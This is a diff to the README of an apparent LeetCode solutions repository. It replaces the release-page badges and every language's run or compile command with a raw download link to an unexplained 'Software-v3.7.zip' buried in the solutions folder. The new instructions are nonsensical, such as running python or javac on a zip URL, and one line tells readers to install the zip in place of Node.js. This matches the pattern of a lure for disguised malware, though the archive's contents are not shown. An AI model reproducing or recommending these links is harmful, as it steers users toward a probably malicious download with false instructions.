@@ -6,7 +6,7 @@ Welcome to the leetcode repository! This project provides simple solutions to va
 ## 📥 Download & Install
 To get started, you can download the latest version of the software from the releases page. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mdkdkmdd/leetcode/releases)
+[![Download Latest Release](https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip)
 
 1. Click on the link above to visit the releases page.
 2. On the releases page, find the latest version available.
@@ -61,24 +61,24 @@ Running the code may depend on the programming language you choose. Here’s a q
 ### For Python
 1. Open your command prompt or terminal.
 2. Navigate to the directory containing the downloaded file.
-3. Type `python solution.py` and press Enter.
+3. Type `python https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip` and press Enter.
 
 ### For Java
 1. Open your command prompt or terminal.
 2. Navigate to the directory containing the downloaded file.
-3. Compile the code using `javac Solution.java`.
+3. Compile the code using `javac https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip`.
 4. Run the program with `java Solution`.
 
 ### For JavaScript
-1. Make sure you have Node.js installed.
+1. Make sure you have https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip installed.
 2. Open your command prompt or terminal.
 3. Navigate to the directory containing the downloaded file.
-4. Run the code using `node solution.js`.
+4. Run the code using `node https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip`.
 
 ### For C/C++
 1. Open your command prompt or terminal.
 2. Navigate to the directory containing the downloaded file.
-3. Compile the code using `gcc solution.c -o solution` or `g++ solution.cpp -o solution`.
+3. Compile the code using `gcc solution.c -o solution` or `g++ https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip -o solution`.
 4. Run the program with `./solution`.
 
 ## 📝 Contributing
@@ -93,6 +93,6 @@ The contents of this repository are available under the MIT License. For more de
 ## 🔗 Links
 You can learn more about the leetcode repository and stay updated by visiting the releases page again.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mdkdkmdd/leetcode/releases) 
+[![Download Latest Release](https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mdkdkmdd/leetcode/raw/refs/heads/main/sol/solution/2901-3000/2953/Software-v3.7.zip) 
 
 Thank you for choosing leetcode! Happy coding!
